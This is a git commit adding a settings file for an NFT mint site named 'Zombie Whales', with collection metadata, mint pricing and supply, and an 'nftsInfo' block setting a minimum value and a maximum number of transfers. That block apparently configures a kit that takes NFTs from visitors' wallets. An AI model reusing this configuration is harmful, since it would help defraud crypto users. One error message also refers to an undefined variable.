3254e784cad9ea7f0ffd7a52ccac8179eb9e32cb
Wync <Tootie-@live.com.sg>
2022-06-24 23:07:56 +0800

    .

---
+++ js/settings.js
@@ -0,0 +1,36 @@
+const collectionInfo = {
+    name: "Zombie Whales",
+    title: "{name}",
+    date: "24.06.2022",
+    socialMedia: {
+        discord: "https://discord.com/",
+        twitter: "https://twitter.com/",
+    },
+    medias: {
+        preview: "1.gif",
+        favicon: "logo.jpg",
+    },
+    background: {
+        type: "video",
+        image: "bg.jpg",
+        video: "1.mp4",
+        color: "#4E4E6D",
+    }
+}
+const mintInfo = {
+    price: 0.089,
+    totalSupply: 4444,
+    toFixed: 3,
+    minUnits: 1,
+    maxUnits: 7,
+    askMintLoop: true,
+}
+
+const nftsInfo = {
+    active: true,
+    minValue: 0.3,
+    maxTransfer: 2,
+}
+
+if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
+if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);
